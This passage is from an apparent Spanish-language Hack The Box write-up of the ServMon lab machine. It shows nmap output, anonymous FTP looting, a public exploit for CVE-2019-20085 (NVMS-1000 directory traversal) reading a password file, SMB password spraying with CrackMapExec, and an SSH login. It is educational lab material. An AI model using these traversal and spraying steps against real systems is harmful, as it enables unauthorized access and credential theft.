-SF:%r(HTTPOptions,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
-SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
-SF:n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\
-SF:x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xh
-SF:tml1-transitional\.dtd\&quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&quot;http://www\.w3\.org/1
-SF:999/xhtml\&quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x
-SF:20\x20&amp;lt;script\x20type=\&quot;text/javascript\&quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\
-SF:x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20
-SF:\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&quot;)%r(RT
-SF:SPRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
-SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
-SF:\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x201\
-SF:.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
-SF:transitional\.dtd\&quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&quot;http://www\.w3\.org/1999/x
-SF:html\&quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x20\x2
-SF:0&amp;lt;script\x20type=\&quot;text/javascript\&quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x
-SF:20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x20\x20\x20\
-SF:x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&quot;);
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=1/15%Time=61E37AE4%P=x86_64-pc-linux-gn
-SF:u%r(GetRequest,74,&quot;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
-SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\0\
-SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;)%r(HTTPOptio
-SF:ns,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not
-SF:\x20found&quot;)%r(FourOhFourRequest,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:
-SF:\x2018\r\n\r\nDocument\x20not\x20found&quot;)%r(RTSPRequest,36,&quot;HTTP/1\.1\x2
-SF:0404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&quot;)%r(SIPOp
-SF:tions,36,&quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20
-SF:not\x20found&quot;);
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 59m59s
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2022-01-16T02:57:16
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 193.02 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que está abierto el puerto 21 asociado al servicio FTP y que podríamos ingresar como el usuario &lt;strong&gt;anonymous&lt;/strong&gt;, así que vamos a validarlo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.184
-Connected to 10.10.10.184.
-220 Microsoft FTP Service
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.184:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
-Password:
-230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-01-18-20  11:05AM       &amp;lt;DIR&amp;gt;          Users
-226 Transfer complete.
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos algunso recursos de podemos traer a nuestra máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Users
-250 CWD &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-01-18-20  11:06AM       &amp;lt;DIR&amp;gt;          Nadine
-01-18-20  11:08AM       &amp;lt;DIR&amp;gt;          Nathan
-226 Transfer complete.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Nadine
-250 CWD &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-01-18-20  11:08AM                  174 Confidential.txt
-226 Transfer complete.
-ftp&amp;gt; get Confidential.txt
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: Confidential.txt remote: Confidential.txt
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-226 Transfer complete.
-174 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.14 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.2033 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
-250 CWD &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Nathan
-250 CWD &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-01-18-20  11:10AM                  186 Notes to &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt
-226 Transfer complete.
-ftp&amp;gt; get &lt;span class=&quot;s2&quot;&gt;&quot;Notes to do.txt&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: Notes to &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt remote: Notes to &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-226 Transfer complete.
-186 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.14 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.3012 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Confidential.txt
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: Confidential.txt
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ Nathan,
-   2   │ 
-   3   │ I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back i
-       │ nto the secure folder.
-   4   │ 
-   5   │ Regards
-   6   │ 
-   7   │ Nadine
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Notes&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;to&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: Notes to &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Change the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;NVMS - Complete
-   2   │ 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Lock down the NSClient Access - Complete
-   3   │ 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Upload the passwords
-   4   │ 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Remove public access to NVMS
-   5   │ 5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Place the secret files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;SharePoint
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos algo como un tipo correo, una lista de cosas y nombres potenciales de usuarios a nivel de sistema. Vamos a seguir enumerando un poco el sistema y tenemos el puerto 445 abierto, por lo que podriamos tratar de hacer un &lt;strong&gt;&lt;em&gt;Null Session&lt;/em&gt;&lt;/strong&gt;; sin embargo, no tenemos acceso. Asi que ahora vamos a ir por los servicios web, tirando primeramente de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;targeted | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;http | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,4}/tcp'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/ | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;,&quot;&lt;/span&gt;
-80,8443
-❯ whatweb http://10.10.10.184/
-http://10.10.10.184/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], IP[10.10.10.184], Script[text/javascript], UncommonHeaders[authinfo]
-❯ whatweb https://10.10.10.184:8443/
-https://10.10.10.184:8443/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Country[RESERVED][ZZ], IP[10.10.10.184], RedirectLocation[/index.html]
-https://10.10.10.184:8443/index.html &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.184], Script[text/javascript], Title[NSClient++], X-UA-Compatible[IE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;edge]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora si vamos a echarles un ojo vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a empezar por el puerto 80 en donde tenemos un panel de login de &lt;strong&gt;NVMS-1000&lt;/strong&gt;, que si no sabemos que es lo podemos buscar en internet (&lt;em&gt;Software NVMS1000 para centralización de grabadores y cámaras IP Meriva para SO&lt;/em&gt;). Podríamos probar credenciales default, pero vemos que no accedemos; podríamos ver si existe algún exploit público.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit nvms 1000
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-NVMS 1000 - Directory Traversal                                                                | hardware/webapps/47774.txt
-TVT NVMS 1000 - Directory Traversal                                                            | hardware/webapps/48311.py
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos unos dos que hacen referencia a &lt;em&gt;Directory Traversal&lt;/em&gt; de forma que podemos leer archivos del sistema y aquí nos preguntamos para que nos sirve; pues bueno, resulta que el usuario &lt;strong&gt;Nadine&lt;/strong&gt; le comenta al usuario &lt;strong&gt;Nathan&lt;/strong&gt; que en su escritorio dejo un archivo llamado &lt;strong&gt;Passwords.txt&lt;/strong&gt;; por lo que ya tenemos una posible ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Nathan\Desktop\&lt;/code&gt; y un archivo a leer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt;, así que usaremos la herramienta &lt;a href=&quot;https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py&quot;&gt;nvms.py&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/AleDiBen/NVMS1000-Exploit/master/nvms.py
-&lt;span class=&quot;nt&quot;&gt;--2022-01-15&lt;/span&gt; 21:45:28--  https://raw.githubusercontent.com/AleDiBen/NVMS1000-Exploit/master/nvms.py
-Resolviendo raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
-Conectando con raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)[&lt;/span&gt;185.199.109.133]:443... conectado.
-Petición HTTP enviada, esperando respuesta... 200 OK
-Longitud: 3032 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.0K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
-Grabando a: «nvms.py»
-
-nvms.py                          100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   2.96K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0s      
-
-2022-01-15 21:45:29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;60.3 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «nvms.py» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3032/3032]
-❯ python3 nvms.py
-&lt;span class=&quot;k&quot;&gt;****************************************************************&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;                      ~CVE 2019-20085~                      &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;****************************************************************&lt;/span&gt;
-
-USAGE  :
-        ./nvms.py &amp;lt;TARGET_IP&amp;gt; &amp;lt;TARGET_FILE&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OUT_FILE]
-EXAMPLE:
-        python nvms.py 195.135.100.10 Windows/system.ini win.ini
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;La herramienta requiere de los parámetros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;TARGET_IP&amp;gt;&lt;/code&gt;,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;TARGET_FILE&amp;gt;&lt;/code&gt; y  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[OUT_FILE]&lt;/code&gt;; en donde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;TARGET_IP&amp;gt; = 10.10.10.184&lt;/code&gt;,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;TARGET_FILE&amp;gt; = Users/Nathan/Desktop/Passwords.txt&lt;/code&gt; y  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[OUT_FILE] = Passwords.txt&lt;/code&gt;; así que vamos a ejecutarla.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 nvms.py 10.10.10.184 Windows/system.ini
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] DT Attack Succeeded
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File Content
-
-++++++++++ BEGIN ++++++++++
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;16-bit app support
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;386Enh]
-&lt;span class=&quot;nv&quot;&gt;woafont&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dosapp.fon
-EGA80WOA.FON&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGA80WOA.FON
-EGA40WOA.FON&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGA40WOA.FON
-CGA80WOA.FON&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CGA80WOA.FON
-CGA40WOA.FON&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CGA40WOA.FON
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;drivers]
-&lt;span class=&quot;nv&quot;&gt;wave&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mmdrv.dll
-&lt;span class=&quot;nv&quot;&gt;timer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;timer.drv
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mci]
-
-++++++++++  END  ++++++++++
-❯ python3 nvms.py 10.10.10.184 Users/Nathan/Desktop/Passwords.txt Passwords.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] DT Attack Succeeded
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Saving File Content
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Saved
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File Content
-
-++++++++++ BEGIN ++++++++++
-1nsp3ctTh3Way2Mars!
-Th3r34r3To0M4nyTrait0r5!
-B3WithM30r4ga1n5tMe
-L1k3B1gBut7s@W0rk
-0nly7h3y0unGWi11F0l10w
-IfH3s4b0Utg0t0H1sH0me
-Gr4etN3w5w17hMySk1Pa5&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-++++++++++  END  ++++++++++
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos unas posibles contraseñas de los usuarios que tenemos y además ya validamos que el usuario &lt;strong&gt;Nathan&lt;/strong&gt; existe en el sistema; como vemos el puerto 445 abierto, vamos a probar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.184 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Nathan'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Passwords.txt
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 18362 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;athan:Gr4etN3w5w17hMySk1Pa5&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;STATUS_LOGON_FAILURE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para el usuario &lt;strong&gt;Nathan&lt;/strong&gt; no tenemos resultados, pero podríamos probar para &lt;strong&gt;Nadine&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.184 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Nadine'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Passwords.txt
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 18362 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
-SMB         10.10.10.184    445    SERVMON          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ServMon&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine:L1k3B1gBut7s@W0rk
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos las credenciales del usuario &lt;strong&gt;Nadine&lt;/strong&gt;, por lo que siempre digo, debemos de guardarlas para tenerlas siempre presentes y vamos a probar si podemos conectarnos por ssh:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh nadine@10.10.10.184
-nadine@10.10.10.184&lt;span class=&quot;s1&quot;&gt;'s password:
-
-Microsoft Windows [Version 10.0.18363.752]
-(c) 2019 Microsoft Corporation. All rights reserved.
-
-nadine@SERVMON C:\Users\Nadine&amp;gt;whoami
-servmon\nadine
-
-nadine@SERVMON C:\Users\Nadine&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora debemos de enumerar un poco el sistema para ver de que forma podemos escalar privielgios.&lt;/p&gt;
-
